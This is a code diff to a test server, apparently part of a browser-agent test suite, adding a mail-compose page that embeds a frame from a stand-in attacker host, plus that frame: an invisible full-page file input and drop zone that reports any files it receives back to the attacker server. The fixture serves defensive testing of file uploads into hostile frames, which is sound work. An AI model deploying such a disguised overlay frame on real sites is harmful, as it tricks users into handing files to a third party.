@@ -369,6 +369,16 @@ document.getElementById('send').addEventListener('click', async () => {
 </script>`,
       )
     }
+    // an allowed page that embeds another site's frame (pane-upload-frames.spec.ts); two fields of its own, so the frame
+    // has no single field near it
+    if (p === '/upload-frame.html') {
+      return page(
+        'Frame page',
+        `<h1>메일 쓰기</h1>
+<section><iframe id="evil" src="http://attacker.test:19158/frame-upload.html" title="광고" style="width:420px;height:220px;border:0"></iframe></section>
+<section><input type="file" id="own1" aria-label="첨부 하나"><input type="file" id="own2" aria-label="첨부 둘"></section>`,
+      )
+    }
     if (p === '/upload-echo' && req.method === 'POST') {
       return req.formData().then(async (fd) => json(await Promise.all(fd.getAll('file').map(async (f) => { const b = new Uint8Array(await (f as File).arrayBuffer()); return { name: (f as File).name, size: b.length, sha256: createHash('sha256').update(b).digest('hex') } }))))
     }
@@ -471,6 +481,20 @@ Bun.serve({
     const url = new URL(req.url)
     if (url.pathname === '/__log') return json({ log: attackerLog })
     attackerLog.push(req.url)
+    // a frame another site embeds (pane-upload-frames.spec.ts): a drop zone and a file field over all of it; whatever
+    // files it gets, it tells this server (/got)
+    if (url.pathname === '/frame-upload.html') {
+      return new Response(`<!doctype html><meta charset="utf-8"><title>ad</title><body style="margin:0">
+<div id="zone" style="position:fixed;inset:0;background:#fee">drop here<input type="file" id="f" multiple style="position:absolute;inset:0;opacity:0;width:100%;height:100%"></div>
+<script>
+const tell = (n) => fetch('/got?n=' + n)
+const z = document.getElementById('zone')
+z.addEventListener('dragover', (e) => e.preventDefault())
+z.addEventListener('drop', (e) => { e.preventDefault(); tell(e.dataTransfer.files.length) })
+document.getElementById('f').addEventListener('change', (e) => tell(e.target.files.length))
+fetch('/frame-loaded')
+</script></body>`, { headers: { 'content-type': 'text/html; charset=utf-8' } })
+    }
     return new Response('<!doctype html><title>ok</title><p>ok</p>', { headers: { 'content-type': 'text/html', 'access-control-allow-origin': '*' } })
   },
 })
